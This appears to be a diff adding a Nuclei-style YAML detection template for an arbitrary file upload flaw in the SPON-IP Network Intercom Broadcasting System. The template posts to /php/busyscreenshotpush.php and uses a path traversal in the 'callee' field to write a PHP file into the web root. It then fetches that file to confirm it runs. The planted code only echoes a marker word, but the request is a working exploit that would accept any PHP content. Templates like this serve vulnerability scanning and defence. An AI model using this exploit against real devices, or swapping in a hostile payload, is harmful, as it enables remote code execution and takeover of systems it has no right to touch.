@@ -1,0 +1,40 @@
+id: poc-yaml-spon-busyscreenshotpush-php-anyfile-upload
+info:
+  name: SPON-IP Network Intercom Broadcasting System Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-file-upload
+http:
+  - raw:
+      - |
+        POST /php/busyscreenshotpush.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jsondata[caller]=1&jsondata[callee]=../../../../../ICPAS/Wnmp/WWW/php/&jsondata[imagename]=1_2_{{filename}}.php&jsondata[imagecontent]={{content}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "upload"
+          - "success"
+  - raw:
+      - |
+        GET /php/1_2_{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerability"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  content: "{{base64('<?php echo \"vulnerability\";?>')}}"
